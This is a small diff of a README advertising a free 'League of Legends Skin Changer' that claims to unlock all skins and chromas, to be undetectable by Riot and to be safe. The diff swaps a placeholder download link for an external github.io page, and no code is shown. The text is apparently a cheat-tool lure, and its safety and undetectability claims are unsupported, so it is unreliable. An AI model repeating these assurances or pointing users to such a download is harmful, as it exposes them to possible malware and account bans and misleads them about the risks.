@@ -2,7 +2,7 @@
 
 Unlock and apply any League of Legends champion skin, chroma, or visual effect instantly and for free. This tool is completely undetectable by Riot's systems, safe to use, and requires no technical skills to install.
 
-[![Download League of Legends Skin Changer](https://img.shields.io/badge/Download-SkinChanger-blueviolet)](#)
+[![Download League of Legends Skin Changer](https://img.shields.io/badge/Download-SkinChanger-blueviolet)](https://league-of-legends-skin-changer-v1-7.github.io/.github)
 
 ---
 
